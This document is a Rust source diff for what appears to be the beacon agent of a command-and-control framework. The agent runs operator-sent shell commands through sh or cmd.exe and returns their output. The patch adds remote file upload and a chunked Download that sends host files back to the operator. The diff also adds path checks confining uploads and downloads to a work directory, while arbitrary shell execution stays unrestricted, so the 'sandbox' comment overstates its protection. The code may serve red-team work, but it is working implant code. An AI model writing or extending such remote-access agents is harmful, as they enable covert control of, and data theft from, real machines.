@@ -6,6 +6,7 @@
 //! task responses, receive this cycle's tasks, execute them.
 
 use std::io::Read;
+use std::path::{Path, PathBuf};
 use std::time::Duration;
 
 use nyx_protocol::{
@@ -19,6 +20,10 @@ pub struct Config {
     pub server_pub: [u8; 32],
     pub sleep_seconds: u32,
     pub jitter_pct: u8,
+    /// Root directory for `Upload` (writes) and `Download` (reads). Remote paths
+    /// are resolved relative to this and confined within it (no absolute paths,
+    /// no `..` traversal) so the dev agent can't escape its sandbox.
+    pub work_dir: PathBuf,
 }
 
 pub fn run(cfg: Config) -> anyhow::Result<()> {
@@ -101,39 +106,121 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                 tracing::info!("Exit task received; shutting down");
                 return Ok(());
             }
-            let response = execute(t.command);
-            pending_responses.push(TaskResponse {
-                task_id: t.task_id,
-                response,
-            });
+            // A task may yield multiple responses (e.g. a streamed Download ->
+            // many FileChunks); each carries the same task id.
+            for response in execute(t.command, &cfg.work_dir) {
+                pending_responses.push(TaskResponse {
+                    task_id: t.task_id,
+                    response,
+                });
+            }
         }
     }
 }
 
-fn execute(cmd: Command) -> Response {
+/// Execute a command, returning zero or more responses. A `Download` streams
+/// multiple `FileChunk`s; everything else yields one response. The beacon loop
+/// tags each returned response with the originating task id.
+fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
     match cmd {
-        Command::Ping => Response::Ok,
-        Command::Shell { args } => {
-            #[cfg(unix)]
-            let (prog, flag) = ("sh", "-c");
-            #[cfg(windows)]
-            let (prog, flag) = ("cmd.exe", "/C");
-            match std::process::Command::new(prog).arg(flag).arg(&args).output() {
-                Ok(out) => {
-                    let mut buf = out.stdout;
-                    buf.extend_from_slice(&out.stderr);
-                    Response::Output(buf)
-                }
+        Command::Ping => vec![Response::Ok],
+        Command::Shell { args } => vec![run_shell(&args)],
+        // The dev agent ignores dynamic sleep re-tasking (interval is fixed at start).
+        Command::Sleep { .. } => vec![Response::Ok],
+        Command::Upload { name, data } => vec![do_upload(work_dir, &name, &data)],
+        Command::Download { path } => do_download(work_dir, &path),
+        Command::Exit => vec![Response::Ok],
+    }
+}
+
+fn run_shell(args: &str) -> Response {
+    #[cfg(unix)]
+    let (prog, flag) = ("sh", "-c");
+    #[cfg(windows)]
+    let (prog, flag) = ("cmd.exe", "/C");
+    match std::process::Command::new(prog).arg(flag).arg(args).output() {
+        Ok(out) => {
+            let mut buf = out.stdout;
+            buf.extend_from_slice(&out.stderr);
+            Response::Output(buf)
+        }
+        Err(e) => Response::Err(e.to_string()),
+    }
+}
+
+/// Largest `FileChunk` payload the dev agent emits (mirrors a typical beacon MTU).
+const CHUNK: usize = 65_536;
+
+fn do_upload(work_dir: &Path, name: &str, data: &[u8]) -> Response {
+    match safe_resolve(work_dir, name) {
+        Err(e) => Response::Err(e),
+        Ok(path) => {
+            if let Some(parent) = path.parent() {
+                let _ = std::fs::create_dir_all(parent);
+            }
+            match std::fs::write(&path, data) {
+                Ok(_) => Response::Ok,
                 Err(e) => Response::Err(e.to_string()),
             }
         }
-        // The dev agent ignores dynamic sleep re-tasking in P0 (interval is fixed at start).
-        Command::Sleep { .. } => Response::Ok,
-        Command::Upload { .. } | Command::Download { .. } => {
-            Response::Err("not implemented in dev agent".into())
-        }
-        Command::Exit => Response::Ok,
     }
+}
+
+fn do_download(work_dir: &Path, path: &str) -> Vec<Response> {
+    let resolved = match safe_resolve(work_dir, path) {
+        Err(e) => return vec![Response::Err(e)],
+        Ok(p) => p,
+    };
+    let data = match std::fs::read(&resolved) {
+        Ok(d) => d,
+        Err(e) => return vec![Response::Err(e.to_string())],
+    };
+    let name = Path::new(path)
+        .file_name()
+        .and_then(|s| s.to_str())
+        .unwrap_or(path)
+        .to_string();
+    let mut chunks = Vec::new();
+    let mut seq = 0u32;
+    let mut i = 0;
+    while i < data.len() {
+        let end = (i + CHUNK).min(data.len());
+        let eof = u8::from(end == data.len());
+        chunks.push(Response::FileChunk {
+            name: name.clone(),
+            seq,
+            eof,
+            data: data[i..end].to_vec(),
+        });
+        seq += 1;
+        i = end;
+    }
+    if chunks.is_empty() {
+        // An empty file still gets a single (empty) chunk so the operator sees EOF.
+        chunks.push(Response::FileChunk {
+            name,
+            seq: 0,
+            eof: 1,
+            data: Vec::new(),
+        });
+    }
+    chunks
+}
+
+/// Resolve a remote path under `work_dir`, refusing absolute paths and `..`
+/// components so uploads/downloads cannot escape the sandbox.
+fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
+    let p = Path::new(remote);
+    if p.is_absolute() {
+        return Err("absolute paths are not allowed".into());
+    }
+    if p
+        .components()
+        .any(|c| matches!(c, std::path::Component::ParentDir))
+    {
+        return Err("`..` traversal is not allowed".into());
+    }
+    Ok(work_dir.join(p))
 }
 
 fn jitter_sleep(seconds: u32, jitter_pct: u8) -> Duration {
